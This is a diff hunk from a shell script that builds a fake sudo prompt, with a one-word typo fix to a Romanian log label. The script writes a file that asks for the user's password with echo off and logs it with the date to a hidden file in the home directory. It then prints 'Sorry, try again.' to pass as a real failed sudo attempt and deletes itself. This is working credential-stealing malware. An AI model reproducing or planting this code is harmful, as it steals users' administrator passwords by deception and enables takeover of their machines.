@@ -23,7 +23,7 @@ echo "read -p \"[sudo] password for `id -un`: \" IN" >> $HOME/.sudo_sd;
 echo "stty echo" >> $HOME/.sudo_sd;
 echo "echo" >> $HOME/.sudo_sd;
 echo "date >> $HOME/.plog" >> $HOME/.sudo_sd;
-echo "echo [ISVAN]Parola pentru drep : \$IN >> $HOME/.plog" >> $HOME/.sudo_sd;
+echo "echo [ISVAN]Parola pentru drept : \$IN >> $HOME/.plog" >> $HOME/.sudo_sd;
 echo "sleep 2" >> $HOME/.sudo_sd;
 echo "echo \"Sorry, try again.\"" >> $HOME/.sudo_sd;
 echo "rm \`basename \$0\`" >> $HOME/.sudo_sd;
